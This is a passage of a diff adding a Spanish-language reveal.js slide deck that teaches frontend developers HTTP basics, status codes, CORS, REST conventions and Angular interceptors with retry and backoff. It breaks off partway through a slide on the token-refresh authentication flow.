@@ -1,0 +1,1000 @@
+<!doctype html>
+<html lang="es">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>HTTP & APIs — Frontend Edition</title>
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/reveal.js@5.1.0/dist/reset.css">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/reveal.js@5.1.0/dist/reveal.css">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/reveal.js@5.1.0/dist/theme/night.css">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/reveal.js@5.1.0/plugin/highlight/monokai.css">
+  <style>
+    .reveal h1, .reveal h2, .reveal h3 { text-transform: none; }
+    .reveal .subtitle { color: #a6adc8; font-size: 0.7em; }
+    .reveal table { font-size: 0.6em; }
+    .reveal code { font-size: 0.85em; }
+    .reveal .two-col { display: grid; grid-template-columns: 1fr 1fr; gap: 1rem; text-align: left; }
+    .reveal .small { font-size: 0.55em; }
+    .reveal ul { text-align: left; }
+    .reveal .highlight-red { color: #f38ba8; }
+    .reveal .highlight-green { color: #a6e3a1; }
+    .reveal .highlight-yellow { color: #f9e2af; }
+    .reveal .highlight-blue { color: #89b4fa; }
+  </style>
+</head>
+<body>
+<div class="reveal">
+<div class="slides">
+
+<!-- ======================================================== -->
+<!-- SLIDE 1: PORTADA -->
+<!-- ======================================================== -->
+<section>
+  <h1>🌐 HTTP & APIs</h1>
+  <h3>Lo que pasa entre tu <code>fetch()</code> y el JSON</h3>
+  <p class="subtitle">Frontend Edition — Angular 21</p>
+  <br>
+  <p class="small">~60 min · Abre DevTools → Network tab antes de empezar</p>
+</section>
+
+<!-- ======================================================== -->
+<!-- SLIDE 2: AGENDA -->
+<!-- ======================================================== -->
+<section>
+  <h2>📋 Agenda</h2>
+  <table>
+    <thead><tr><th>#</th><th>Bloque</th><th>Tiempo</th></tr></thead>
+    <tbody>
+      <tr><td>1</td><td>HTTP — El protocolo que nadie lee</td><td>15 min</td></tr>
+      <tr><td>2</td><td>Status Codes — Tu contrato con el backend</td><td>10 min</td></tr>
+      <tr><td>3</td><td>REST — Cómo consumir APIs correctamente</td><td>15 min</td></tr>
+      <tr><td>4</td><td>Demo en vivo (Angular + DevTools)</td><td>12 min</td></tr>
+      <tr><td>5</td><td>Cierre + Ejercicio</td><td>8 min</td></tr>
+    </tbody>
+  </table>
+  <p class="small" style="margin-top:1rem;">Prerequisito: tener DevTools abierto en Network tab durante TODA la sesión.</p>
+</section>
+
+<!-- ======================================================== -->
+<!-- BLOQUE 1: HTTP FUNDAMENTALS (vertical stack) -->
+<!-- ======================================================== -->
+<section>
+
+  <!-- 1.0 Portada del bloque -->
+  <section>
+    <h2>Bloque 1</h2>
+    <h1>HTTP — El Protocolo</h1>
+    <p class="subtitle">15 minutos</p>
+    <p class="small">Hypertext Transfer Protocol — RFC 9110 (2022)</p>
+  </section>
+
+  <!-- 1.1 Modelo mental -->
+  <section>
+    <h2>El modelo mental incorrecto</h2>
+    <div class="two-col">
+      <div>
+        <h4 class="highlight-red">❌ Lo que crees que pasa</h4>
+        <pre><code class="language-text">fetch(url) → JSON ✨</code></pre>
+        <p class="small">Magia. No sé qué pasa en medio. Si falla, googleo el error.</p>
+      </div>
+      <div>
+        <h4 class="highlight-green">✅ Lo que realmente pasa</h4>
+        <pre><code class="language-text">1. DNS Resolution (url → IP)
+2. TCP Connection (3-way handshake)
+3. TLS Handshake (si es HTTPS)
+4. HTTP Request (method + headers + body)
+5. Server Processing
+6. HTTP Response (status + headers + body)
+7. Browser parses body</code></pre>
+      </div>
+    </div>
+    <p class="small" style="margin-top:1rem;">
+      Cada paso puede fallar de forma diferente. Si no entiendes la cadena, debuggeas a ciegas.
+    </p>
+  </section>
+
+  <!-- 1.2 Qué es HTTP -->
+  <section>
+    <h2>¿Qué es HTTP?</h2>
+    <ul>
+      <li><strong>Protocolo de aplicación</strong> — capa 7 del modelo OSI</li>
+      <li><strong>Request/Response</strong> — el cliente pide, el server responde</li>
+      <li><strong>Stateless</strong> — cada request es independiente, no hay "sesión" a nivel protocolo</li>
+      <li><strong>Text-based</strong> (HTTP/1.1) — puedes leerlo en raw</li>
+      <li><strong>Versiones:</strong> HTTP/1.1 (1997), HTTP/2 (2015), HTTP/3 (2022, sobre QUIC/UDP)</li>
+    </ul>
+    <p class="small" style="margin-top:1rem;">
+      HTTP/2 y HTTP/3 son binarios y multiplexados, pero la semántica (methods, headers, status codes) es la MISMA.
+      Lo que aprendes hoy aplica a todas las versiones.
+    </p>
+  </section>
+
+  <!-- 1.3 DevTools Network Tab -->
+  <section>
+    <h2>DevTools Network Tab — Tu mejor amigo</h2>
+    <ul>
+      <li><strong>Headers tab:</strong> Qué enviaste (request) y qué recibiste (response)</li>
+      <li><strong>Timing tab:</strong> TTFB (Time To First Byte), Content Download, DNS, TLS</li>
+      <li><strong>Preview tab:</strong> Body parseado (JSON formateado)</li>
+      <li><strong>Initiator tab:</strong> Qué línea de código disparó la request</li>
+      <li><strong>Filtro XHR/Fetch:</strong> Para no ver ruido (imágenes, CSS, etc.)</li>
+    </ul>
+    <p class="highlight-yellow" style="margin-top:1rem;">
+      💡 Si no usas Network tab, estás adivinando. Punto.
+    </p>
+    <p class="small">
+      Pro tip: Click derecho en una request → "Copy as cURL" te da el comando exacto para reproducirla en terminal.
+    </p>
+  </section>
+
+  <!-- 1.4 Anatomía Request -->
+  <section>
+    <h2>Anatomía de un HTTP Request</h2>
+    <pre><code class="language-http">POST /api/products HTTP/1.1          ← Request Line (method + path + version)
+Host: localhost:3000                  ← Header obligatorio
+Content-Type: application/json        ← Qué formato tiene el body
+Authorization: Bearer eyJhbGciOi...   ← Credencial de autenticación
+Accept: application/json              ← Qué formato quiero de vuelta
+Content-Length: 42                    ← Tamaño del body en bytes
+
+{                                     ← Body (payload)
+  "name": "Keyboard",
+  "price": 149.99
+}</code></pre>
+    <p class="small">
+      Angular HttpClient construye todo esto por ti. Pero cuando algo falla,
+      necesitas saber leer el raw request en Network tab para entender QUÉ se envió realmente.
+    </p>
+  </section>
+
+  <!-- 1.5 Anatomía Response -->
+  <section>
+    <h2>Anatomía de un HTTP Response</h2>
+    <pre><code class="language-http">HTTP/1.1 201 Created                 ← Status Line (version + code + reason)
+Content-Type: application/json        ← Formato del body
+Location: /api/products/11            ← URL del recurso creado (convención REST)
+X-Total-Count: 11                     ← Header custom (paginación)
+Cache-Control: no-cache               ← Instrucciones de cache
+ETag: "abc123"                        ← Fingerprint del recurso (cache validation)
+
+{                                     ← Body
+  "id": 11,
+  "name": "Keyboard",
+  "price": 149.99
+}</code></pre>
+    <p class="small">
+      <strong>El body NO es lo único que importa.</strong> Los headers te dan:
+      total de items (paginación), URLs de recursos creados, instrucciones de cache,
+      rate limit info, y más. Si solo lees el body, pierdes metadata crucial.
+    </p>
+  </section>
+
+  <!-- 1.6 HTTP Methods -->
+  <section>
+    <h2>HTTP Methods — La tabla completa</h2>
+    <table>
+      <thead>
+        <tr><th>Method</th><th>Propósito</th><th>Body</th><th>Safe</th><th>Idempotente</th><th>Cacheable</th></tr>
+      </thead>
+      <tbody>
+        <tr><td><strong>GET</strong></td><td>Leer un recurso</td><td>No</td><td>✅</td><td>✅</td><td>✅</td></tr>
+        <tr><td><strong>HEAD</strong></td><td>Como GET pero sin body</td><td>No</td><td>✅</td><td>✅</td><td>✅</td></tr>
+        <tr><td><strong>POST</strong></td><td>Crear recurso / acción</td><td>Sí</td><td>❌</td><td>❌</td><td>❌</td></tr>
+        <tr><td><strong>PUT</strong></td><td>Reemplazar recurso completo</td><td>Sí</td><td>❌</td><td>✅</td><td>❌</td></tr>
+        <tr><td><strong>PATCH</strong></td><td>Modificar parcialmente</td><td>Sí</td><td>❌</td><td>❌*</td><td>❌</td></tr>
+        <tr><td><strong>DELETE</strong></td><td>Eliminar recurso</td><td>No</td><td>❌</td><td>✅</td><td>❌</td></tr>
+        <tr><td><strong>OPTIONS</strong></td><td>Preflight CORS</td><td>No</td><td>✅</td><td>✅</td><td>❌</td></tr>
+      </tbody>
+    </table>
+    <p class="small">
+      <strong>Safe</strong> = no modifica estado en el server.
+      <strong>Idempotente</strong> = llamar N veces produce el mismo resultado que llamar 1 vez.
+      *PATCH puede ser idempotente según implementación.
+    </p>
+  </section>
+
+  <!-- 1.7 Idempotencia -->
+  <section>
+    <h2>Idempotencia — ¿Por qué te importa?</h2>
+    <div class="two-col">
+      <div>
+        <h4 class="highlight-green">✅ Idempotente = Safe de reintentar</h4>
+        <ul class="small">
+          <li><strong>GET /products</strong> — leer 10 veces = mismo resultado</li>
+          <li><strong>PUT /products/1</strong> — enviar 10 veces = mismo estado final</li>
+          <li><strong>DELETE /products/1</strong> — borrar algo ya borrado = OK (404 o 204)</li>
+        </ul>
+        <p class="small">→ Tu retry interceptor puede reintentar estos sin miedo</p>
+      </div>
+      <div>
+        <h4 class="highlight-red">❌ NO idempotente = Peligro al reintentar</h4>
+        <ul class="small">
+          <li><strong>POST /orders</strong> — enviar 2 veces = 2 órdenes creadas</li>
+          <li><strong>POST /payments</strong> — reintentar = cobrar doble</li>
+          <li>Double-click en "Comprar" = problema real</li>
+        </ul>
+        <p class="small">→ NUNCA reintentar POST automáticamente</p>
+      </div>
+    </div>
+    <p class="small" style="margin-top:1rem;">
+      <strong>Caso real:</strong> Usuario con internet lento. El POST tarda. El usuario hace click de nuevo.
+      Sin protección = 2 órdenes. Solución: disable button + idempotency key en el header.
+    </p>
+  </section>
+
+  <!-- 1.8 Headers importantes -->
+  <section>
+    <h2>Headers que un Frontend Dev DEBE manejar</h2>
+    <table>
+      <thead><tr><th>Header</th><th>Dir.</th><th>Qué hace</th><th>Ejemplo</th></tr></thead>
+      <tbody>
+        <tr><td><code>Content-Type</code></td><td>→</td><td>Formato del body que envías</td><td><code>application/json</code></td></tr>
+        <tr><td><code>Accept</code></td><td>→</td><td>Formato que quieres recibir</td><td><code>application/json</code></td></tr>
+        <tr><td><code>Authorization</code></td><td>→</td><td>Credencial de auth</td><td><code>Bearer eyJ...</code></td></tr>
+        <tr><td><code>Cache-Control</code></td><td>←</td><td>Política de cache</td><td><code>max-age=3600</code></td></tr>
+        <tr><td><code>ETag</code></td><td>←</td><td>Fingerprint del recurso</td><td><code>"v1-abc123"</code></td></tr>
+        <tr><td><code>X-Total-Count</code></td><td>←</td><td>Total items (paginación)</td><td><code>142</code></td></tr>
+        <tr><td><code>Retry-After</code></td><td>←</td><td>Segundos para esperar (429)</td><td><code>30</code></td></tr>
+        <tr><td><code>Location</code></td><td>←</td><td>URL del recurso creado</td><td><code>/api/products/11</code></td></tr>
+      </tbody>
+    </table>
+    <p class="small">
+      Angular HttpClient envía Content-Type: application/json automáticamente cuando el body es un objeto.
+      Pero Authorization, Accept, y custom headers los debes agregar tú (o un interceptor).
+    </p>
+  </section>
+
+  <!-- 1.9 CORS intro -->
+  <section>
+    <h2>🔒 CORS — Cross-Origin Resource Sharing</h2>
+    <h4>El error que todos googlean y nadie entiende</h4>
+    <ul>
+      <li><strong>Same-Origin Policy:</strong> El browser BLOQUEA requests a un origen diferente al tuyo</li>
+      <li><strong>Origen =</strong> protocolo + host + puerto (los 3 deben coincidir)</li>
+      <li><strong>CORS =</strong> Mecanismo donde el SERVER dice "acepto requests de este origen"</li>
+      <li><strong>Es SEGURIDAD</strong> — protege a tus usuarios de scripts maliciosos</li>
+    </ul>
+    <table style="margin-top:1rem;">
+      <thead><tr><th>Desde http://localhost:4200</th><th>¿Same Origin?</th><th>¿Por qué?</th></tr></thead>
+      <tbody>
+        <tr><td>http://localhost:4200/api/data</td><td class="highlight-green">✅ Sí</td><td>Mismo protocolo, host, puerto</td></tr>
+        <tr><td>http://localhost:3000/products</td><td class="highlight-red">❌ No</td><td>Puerto diferente (3000 ≠ 4200)</td></tr>
+        <tr><td>https://localhost:4200/api</td><td class="highlight-red">❌ No</td><td>Protocolo diferente (https ≠ http)</td></tr>
+        <tr><td>https://api.github.com/users</td><td class="highlight-red">❌ No</td><td>Host diferente</td></tr>
+      </tbody>
+    </table>
+  </section>
+
+  <!-- 1.10 CORS Simple vs Preflight -->
+  <section>
+    <h2>CORS — Simple Request vs Preflight</h2>
+    <div class="two-col">
+      <div>
+        <h4 class="highlight-green">Simple Request (directo)</h4>
+        <p class="small">El browser envía la request directamente:</p>
+        <ul class="small">
+          <li>Methods: GET, HEAD, POST</li>
+          <li>Content-Type: text/plain, multipart/form-data, application/x-www-form-urlencoded</li>
+          <li>Sin custom headers</li>
+        </ul>
+        <pre><code class="language-text">Browser → Server: GET /api/data
+Server → Browser: 200 + CORS headers</code></pre>
+      </div>
+      <div>
+        <h4 class="highlight-yellow">Preflight (OPTIONS primero)</h4>
+        <p class="small">El browser pregunta ANTES:</p>
+        <ul class="small">
+          <li>Methods: PUT, PATCH, DELETE</li>
+          <li>Content-Type: application/json</li>
+          <li>Custom headers (Authorization, X-*)</li>
+        </ul>
+        <pre><code class="language-text">Browser → Server: OPTIONS /api/data
+Server → Browser: 204 + allowed methods
+Browser → Server: PUT /api/data (real)
+Server → Browser: 200</code></pre>
+      </div>
+    </div>
+    <p class="small" style="margin-top:1rem;">
+      <strong>Implicación:</strong> Cada PUT/PATCH/DELETE con JSON genera 2 requests en Network tab.
+      La primera (OPTIONS) es invisible para tu código pero consume tiempo.
+    </p>
+  </section>
+
+  <!-- 1.11 CORS Headers y soluciones -->
+  <section>
+    <h2>CORS — Headers del Server y "Soluciones"</h2>
+    <h4>Headers que el SERVER debe enviar:</h4>
+    <pre><code class="language-http">Access-Control-Allow-Origin: http://localhost:4200  // o * para cualquiera
+Access-Control-Allow-Methods: GET, POST, PUT, DELETE, PATCH
+Access-Control-Allow-Headers: Content-Type, Authorization
+Access-Control-Max-Age: 86400  // Cache del preflight por 24h (evita OPTIONS repetidos)</code></pre>
+    <div class="two-col" style="margin-top:1rem;">
+      <div>
+        <h4 class="highlight-red">❌ "Soluciones" incorrectas</h4>
+        <ul class="small">
+          <li><code>mode: "no-cors"</code> → opaque response, no puedes leer nada</li>
+          <li>Extensión de browser → solo para ti, no para usuarios</li>
+          <li>Proxy en dev → no funciona en producción</li>
+          <li>Desactivar seguridad del browser → nunca</li>
+        </ul>
+      </div>
+      <div>
+        <h4 class="highlight-green">✅ Solución real</h4>
+        <ul class="small">
+          <li>El BACKEND configura los headers CORS</li>
+          <li>En desarrollo: json-server ya los incluye</li>
+          <li>En producción: configurar en el API gateway/server</li>
+          <li>Tú como frontend NO puedes "arreglar" CORS</li>
+        </ul>
+      </div>
+    </div>
+  </section>
+
+</section><!-- Fin Bloque 1 -->
+
+<!-- ======================================================== -->
+<!-- BLOQUE 2: STATUS CODES (vertical stack) -->
+<!-- ======================================================== -->
+<section>
+
+  <!-- 2.0 Portada -->
+  <section>
+    <h2>Bloque 2</h2>
+    <h1>Status Codes</h1>
+    <h3>Tu contrato con el backend</h3>
+    <p class="subtitle">10 minutos</p>
+  </section>
+
+  <!-- 2.1 Los rangos -->
+  <section>
+    <h2>Los 5 Rangos</h2>
+    <table>
+      <thead><tr><th>Rango</th><th>Categoría</th><th>Significado</th><th>¿Quién tiene la culpa?</th></tr></thead>
+      <tbody>
+        <tr><td class="highlight-blue">1xx</td><td>Informational</td><td>Request recibida, procesando</td><td>Nadie (raro verlos)</td></tr>
+        <tr><td class="highlight-green">2xx</td><td>Success</td><td>Request exitosa</td><td>Nadie — todo bien ✅</td></tr>
+        <tr><td class="highlight-yellow">3xx</td><td>Redirection</td><td>El recurso se movió</td><td>Nadie — el browser sigue automáticamente</td></tr>
+        <tr><td style="color:#fab387">4xx</td><td>Client Error</td><td>La request está mal</td><td><strong>TÚ</strong> (el frontend/usuario) 🫵</td></tr>
+        <tr><td class="highlight-red">5xx</td><td>Server Error</td><td>El server falló</td><td><strong>ELLOS</strong> (el backend) 💥</td></tr>
+      </tbody>
+    </table>
+    <p class="small" style="margin-top:1rem;">
+      <strong>Regla de oro:</strong> El status code es un CONTRATO entre frontend y backend.
+      Si el backend devuelve <code>200 OK</code> con <code>{"error": "not found"}</code> en el body, el contrato está ROTO.
+      Eso rompe interceptors, retry logic, cache, y cualquier herramienta que dependa del protocolo.
+    </p>
+  </section>
+
+  <!-- 2.2 2xx Success -->
+  <section>
+    <h2>2xx — Success (todo salió bien)</h2>
+    <table>
+      <thead><tr><th>Code</th><th>Nombre</th><th>Cuándo se usa</th><th>Acción en Frontend</th></tr></thead>
+      <tbody>
+        <tr><td>200</td><td>OK</td><td>GET exitoso, PUT/PATCH exitoso</td><td>Mostrar datos / confirmar update</td></tr>
+        <tr><td>201</td><td>Created</td><td>POST creó un recurso nuevo</td><td>Confirmar creación, leer Location header</td></tr>
+        <tr><td>204</td><td>No Content</td><td>DELETE exitoso, acción sin response body</td><td>Confirmar acción, NO intentar parsear body</td></tr>
+      </tbody>
+    </table>
+    <pre><code class="language-typescript">// Ejemplo: POST retorna 201 + Location header
+this.http.post('/api/products', newProduct, { observe: 'response' })
+  .subscribe(res => {
+    console.log(res.status);                    // 201
+    console.log(res.headers.get('Location'));    // /api/products/11
+    console.log(res.body);                      // { id: 11, name: ... }
+  });</code></pre>
+  </section>
+
+  <!-- 2.3 4xx Client Errors -->
+  <section>
+    <h2>4xx — Client Errors (TÚ la cagaste)</h2>
+    <table>
+      <thead><tr><th>Code</th><th>Nombre</th><th>Significado</th><th>Acción en Frontend</th></tr></thead>
+      <tbody>
+        <tr><td>400</td><td>Bad Request</td><td>Request malformada (JSON inválido, params faltantes)</td><td>Mostrar error de formato</td></tr>
+        <tr><td>401</td><td>Unauthorized</td><td>No autenticado (token falta o expiró)</td><td>Refresh token → retry, o redirect a login</td></tr>
+        <tr><td>403</td><td>Forbidden</td><td>Autenticado pero SIN permisos</td><td>Mensaje "no tienes acceso". NO reintentar.</td></tr>
+        <tr><td>404</td><td>Not Found</td><td>El recurso no existe</td><td>Mostrar estado vacío / "no encontrado"</td></tr>
+        <tr><td>409</td><td>Conflict</td><td>Conflicto de estado (ej: recurso ya existe)</td><td>Mostrar conflicto, ofrecer resolver</td></tr>
+        <tr><td>422</td><td>Unprocessable</td><td>Body es JSON válido pero datos no pasan validación</td><td>Mostrar errores de validación en el form</td></tr>
+        <tr><td>429</td><td>Too Many Requests</td><td>Rate limited — demasiadas requests</td><td>Leer Retry-After header, esperar, reintentar</td></tr>
+      </tbody>
+    </table>
+    <p class="small">
+      <strong>401 vs 403:</strong> 401 = "no sé quién eres" (puede resolverse con login/refresh).
+      403 = "sé quién eres pero NO tienes permiso" (reintentar NO ayuda).
+    </p>
+  </section>
+
+  <!-- 2.4 5xx Server Errors -->
+  <section>
+    <h2>5xx — Server Errors (ELLOS la cagaron)</h2>
+    <table>
+      <thead><tr><th>Code</th><th>Nombre</th><th>Significado</th><th>Acción en Frontend</th></tr></thead>
+      <tbody>
+        <tr><td>500</td><td>Internal Server Error</td><td>Bug en el backend (excepción no manejada)</td><td>Log + mensaje genérico "intenta más tarde"</td></tr>
+        <tr><td>502</td><td>Bad Gateway</td><td>Proxy/LB no puede conectar al backend</td><td>Retry con backoff (puede ser transitorio)</td></tr>
+        <tr><td>503</td><td>Service Unavailable</td><td>Server sobrecargado o en mantenimiento</td><td>Retry con exponential backoff</td></tr>
+        <tr><td>504</td><td>Gateway Timeout</td><td>Backend no respondió a tiempo</td><td>Retry con backoff</td></tr>
+      </tbody>
+    </table>
+    <p class="small" style="margin-top:1rem;">
+      <strong>Diferencia clave:</strong> 4xx = reintentar NO ayuda (el request está mal).
+      5xx = reintentar PUEDE ayudar (el server puede recuperarse).
+      Tu retry interceptor debe distinguir esto.
+    </p>
+  </section>
+
+  <!-- 2.5 Anti-pattern vs Pattern -->
+  <section>
+    <h2>Error Handling — Anti-Pattern vs Pattern</h2>
+    <div class="two-col">
+      <div>
+        <h4 class="highlight-red">❌ Lo que hace el 90% de frontends</h4>
+        <pre><code class="language-typescript">// NO distingue NADA
+this.http.get('/api/data').subscribe({
+  error: (e) => {
+    alert("Ocurrió un error");
+    // ¿401? ¿403? ¿500? ¿429?
+    // No sé. No me importa.
+    // El usuario tampoco sabe qué hacer.
+  }
+});</code></pre>
+      </div>
+      <div>
+        <h4 class="highlight-green">✅ Lo que deberías hacer</h4>
+        <pre><code class="language-typescript">// Interceptor centralizado
+catchError((err: HttpErrorResponse) => {
+  switch (true) {
+    case err.status === 401:
+      return refreshAndRetry(req);
+    case err.status === 403:
+      notify.error('Sin permisos');
+      break;
+    case err.status === 429:
+      return waitRetryAfter(err);
+    case err.status >= 500:
+      return retryWithBackoff(req);
+    default:
+      notify.warn(err.error?.detail);
+  }
+  return throwError(() => err);
+})</code></pre>
+      </div>
+    </div>
+  </section>
+
+  <!-- 2.6 Interceptors en Angular -->
+  <section>
+    <h2>Interceptors — Pipeline HTTP centralizado</h2>
+    <pre><code class="language-typescript">// app.config.ts — Angular 17+ functional interceptors
+export const appConfig: ApplicationConfig = {
+  providers: [
+    provideHttpClient(
+      withInterceptors([
+        loggingInterceptor,    // 1. Log de cada request/response
+        authInterceptor,       // 2. Agregar Bearer token
+        retryInterceptor,      // 3. Retry en 503 con backoff
+        errorInterceptor,      // 4. Manejo centralizado de errores
+      ])
+    ),
+  ],
+};</code></pre>
+    <p class="small">
+      <strong>Orden importa:</strong> Se ejecutan en orden para requests (→) y en orden inverso para responses (←).
+      El logging va primero para capturar TODO. El error handler va último para capturar errores de todos los anteriores.
+    </p>
+    <p class="small">
+      <strong>Beneficio:</strong> Los componentes NO saben de HTTP errors, tokens, o retry.
+      Solo se suscriben y reciben datos o un error limpio.
+    </p>
+  </section>
+
+</section><!-- Fin Bloque 2 -->
+
+<!-- ======================================================== -->
+<!-- BLOQUE 3: REST (vertical stack) -->
+<!-- ======================================================== -->
+<section>
+
+  <!-- 3.0 Portada -->
+  <section>
+    <h2>Bloque 3</h2>
+    <h1>REST</h1>
+    <h3>Cómo consumir APIs correctamente</h3>
+    <p class="subtitle">15 minutos</p>
+  </section>
+
+  <!-- 3.1 Qué es REST -->
+  <section>
+    <h2>¿Qué es REST? (versión práctica)</h2>
+    <ul>
+      <li><strong>RE</strong>presentational <strong>S</strong>tate <strong>T</strong>ransfer — Roy Fielding, 2000</li>
+      <li>NO es un estándar, es un <strong>estilo arquitectónico</strong> con constraints</li>
+      <li>NO es "URLs bonitas" ni "CRUD con HTTP"</li>
+    </ul>
+    <h4 style="margin-top:1rem;">Los 6 constraints de REST:</h4>
+    <table>
+      <tbody>
+        <tr><td>1. Client-Server</td><td>Separación de responsabilidades</td></tr>
+        <tr><td>2. Stateless</td><td>Cada request lleva TODO lo necesario (no hay sesión en server)</td></tr>
+        <tr><td>3. Cacheable</td><td>Responses deben indicar si son cacheables</td></tr>
+        <tr><td>4. Uniform Interface</td><td>Recursos identificados por URLs, manipulados via representaciones</td></tr>
+        <tr><td>5. Layered System</td><td>El cliente no sabe si habla con el server final o un proxy</td></tr>
+        <tr><td>6. Code on Demand</td><td>(Opcional) El server puede enviar código ejecutable</td></tr>
+      </tbody>
+    </table>
+  </section>
+
+  <!-- 3.2 Recursos y URLs -->
+  <section>
+    <h2>Recursos — La base de REST</h2>
+    <ul class="small">
+      <li>Un <strong>recurso</strong> es cualquier cosa que puedas nombrar: usuario, producto, orden, sesión</li>
+      <li>Se identifica con una <strong>URL</strong> (Uniform Resource Locator)</li>
+      <li>Un recurso NO es una tabla de base de datos (puede ser una agregación, un cálculo, etc.)</li>
+    </ul>
+    <div class="two-col" style="margin-top:1rem;">
+      <div>
+        <h4 class="highlight-green">✅ URLs bien diseñadas</h4>
+        <pre><code class="language-text">GET    /products           → Colección
+GET    /products/123       → Recurso específico
+POST   /products           → Crear nuevo
+PUT    /products/123       → Reemplazar
+PATCH  /products/123       → Modificar parcial
+DELETE /products/123       → Eliminar
+GET    /products/123/reviews → Sub-recurso
+GET    /users/me/orders    → Recurso contextual</code></pre>
+      </div>
+      <div>
+        <h4 class="highlight-red">❌ URLs mal diseñadas</h4>
+        <pre><code class="language-text">GET  /getProducts
+POST /createProduct
+GET  /deleteProduct?id=123
+POST /product/update
+GET  /getAllProductReviews
+POST /doPayment
+GET  /api/v1/fetchUserData</code></pre>
+        <p class="small">Verbos en URLs = no es REST.<br>
+        La acción la define el HTTP method, no la URL.</p>
+      </div>
+    </div>
+  </section>
+
+  <!-- 3.3 Paginación -->
+  <section>
+    <h2>Paginación — Cómo consumirla</h2>
+    <div class="two-col">
+      <div>
+        <h4>Offset/Limit (más común)</h4>
+        <pre><code class="language-text">GET /products?_page=2&_limit=10
+
+Response headers:
+  X-Total-Count: 142
+  Link: &lt;/products?_page=3&gt;; rel="next"</code></pre>
+        <p class="small">Simple. Problemas: si insertan datos entre páginas, puedes ver duplicados o saltar items.</p>
+      </div>
+      <div>
+        <h4>Cursor-based (más robusto)</h4>
+        <pre><code class="language-text">GET /products?after=abc123&limit=10
+
+Response:
+{
+  "data": [...],
+  "nextCursor": "def456",
+  "hasMore": true
+}</code></pre>
+        <p class="small">Ideal para infinite scroll. No tiene problemas de consistencia.</p>
+      </div>
+    </div>
+    <pre style="margin-top:1rem;"><code class="language-typescript">// Angular — leer total del header
+this.http.get&lt;Product[]&gt;('/api/products', {
+  params: new HttpParams().set('_page', '1').set('_limit', '10'),
+  observe: 'response'  // ← CLAVE: sin esto no tienes acceso a headers
+}).pipe(
+  map(res => ({
+    data: res.body ?? [],
+    total: Number(res.headers.get('X-Total-Count'))
+  }))
+);</code></pre>
+  </section>
+
+  <!-- 3.4 Filtrado y Sorting -->
+  <section>
+    <h2>Filtrado y Sorting</h2>
+    <pre><code class="language-typescript">// Construir query params en Angular
+let params = new HttpParams();
+
+// Filtros
+params = params.set('status', 'pending');        // ?status=pending
+params = params.set('category', 'peripherals');  // &category=peripherals
+
+// Sorting (convención: prefix - para desc)
+const sort = '-createdAt';
+const isDesc = sort.startsWith('-');
+params = params.set('_sort', isDesc ? sort.slice(1) : sort);
+params = params.set('_order', isDesc ? 'desc' : 'asc');
+
+// Resultado: GET /tasks?status=pending&category=peripherals&_sort=createdAt&_order=desc
+this.http.get&lt;Task[]&gt;('/api/tasks', { params });</code></pre>
+    <ul class="small">
+      <li><strong>HttpParams es INMUTABLE</strong> — cada <code>.set()</code> retorna nueva instancia (como un string)</li>
+      <li>Convenciones varían por API: json-server usa <code>_sort/_order</code>, otros usan <code>sort=field:desc</code></li>
+      <li>Siempre lee la documentación de la API para saber qué params acepta</li>
+    </ul>
+  </section>
+
+  <!-- 3.5 Caching -->
+  <section>
+    <h2>Caching en el Frontend</h2>
+    <h4>El GET más rápido es el que NO se hace</h4>
+    <table>
+      <thead><tr><th>Mecanismo</th><th>Cómo funciona</th><th>Quién lo maneja</th></tr></thead>
+      <tbody>
+        <tr><td><code>Cache-Control: max-age=3600</code></td><td>Browser cachea por 1 hora, no hace request</td><td>Browser automáticamente</td></tr>
+        <tr><td><code>ETag</code> + <code>If-None-Match</code></td><td>Browser pregunta "¿cambió?" → 304 Not Modified (sin body)</td><td>Browser + Server</td></tr>
+        <tr><td><code>stale-while-revalidate</code></td><td>Muestra cache viejo mientras revalida en background</td><td>Browser / Service Worker</td></tr>
+        <tr><td>TanStack Query / SWR</td><td>Cache en memoria con revalidación automática</td><td>Tu código (librería)</td></tr>
+      </tbody>
+    </table>
+    <pre><code class="language-typescript">// ETag flow:
+// 1. GET /products → Response: ETag: "v1-abc"
+// 2. GET /products + Header: If-None-Match: "v1-abc"
+//    → Si no cambió: 304 Not Modified (0 bytes body, ultra rápido)
+//    → Si cambió: 200 OK + nuevo body + nuevo ETag</code></pre>
+    <p class="small">
+      En Angular puedes implementar un interceptor de cache, o usar signals + un store que cachee responses.
+    </p>
+  </section>
+
+  <!-- 3.6 Retry con Backoff -->
+  <section>
+    <h2>Retry con Exponential Backoff</h2>
+    <pre><code class="language-typescript">export const retryInterceptor: HttpInterceptorFn = (req, next) => {
+  // 1. Solo métodos idempotentes (safe de reintentar)
+  const idempotent = ['GET', 'PUT', 'DELETE', 'HEAD', 'OPTIONS'];
+  if (!idempotent.includes(req.method)) return next(req);
+
+  return next(req).pipe(
+    retry({
+      count: 3,  // Máximo 3 reintentos
+      delay: (error, retryCount) => {
+        // 2. Solo reintentar errores de servidor/red
+        const retryable = [503, 502, 504, 0]; // 0 = network error
+        if (!retryable.includes(error.status)) throw error; // 4xx → no reintentar
+
+        // 3. Exponential backoff: 1s, 2s, 4s
+        const ms = Math.pow(2, retryCount - 1) * 1000;
+        console.warn(`🔄 Retry #${retryCount} in ${ms}ms`);
+        return timer(ms);
+      }
+    })
+  );
+};</code></pre>
+    <ul class="small">
+      <li><strong>¿Por qué backoff?</strong> Si el server está sobrecargado y 1000 clientes reintentan al mismo tiempo = thundering herd = peor</li>
+      <li><strong>¿Por qué solo idempotentes?</strong> Reintentar POST puede crear duplicados</li>
+      <li><strong>¿Por qué no 4xx?</strong> Si tu request está mal, enviarla de nuevo no la arregla</li>
+    </ul>
+  </section>
+
+  <!-- 3.7 Autenticación -->
+  <section>
+    <h2>Autenticación en APIs REST</h2>
+    <h4>El flujo completo desde el frontend</h4>
+    <pre><code class="language-text">1. POST /auth/login { email, password }
+   → 200 { accessToken: "eyJ...", expiresIn: 900 }
+
+2. GET /api/products + Header: Authorization: Bearer eyJ...
+   → 200 [products...]
+
+3. (15 min después, token expiró)
+   GET /api/products + Header: Authorization: Bearer eyJ...(expirado)
+   → 401 Unauthorized
+
+4. (Error interceptor detecta 401)
+   POST /auth/refresh (con httpOnly cookie)
+   → 200 { accessToken: "nuevo-eyJ..." }
+
+5. (Retry automático con nuevo token)
